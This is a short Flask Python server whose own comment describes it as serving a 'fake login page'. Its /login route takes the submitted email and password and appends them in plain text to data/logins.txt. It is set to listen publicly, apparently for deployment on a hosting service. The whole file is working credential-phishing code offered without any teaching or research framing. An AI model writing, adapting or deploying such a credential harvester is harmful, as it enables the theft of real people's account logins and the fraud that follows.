from flask import Flask, request, render_template
import os

app = Flask(__name__)

# Ensure 'data' folder exists
if not os.path.exists("data"):
    os.makedirs("data")

# Serve the fake login page


@app.route("/")
def home():
    # Render the page from the templates folder
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Save credentials in 'data/logins.txt'
    with open("data/logins.txt", "a") as file:
        file.write(f"Email: {email}\nPassword: {password}\n\n")

    return "Login credentials saved successfully!", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)  # Render requires this
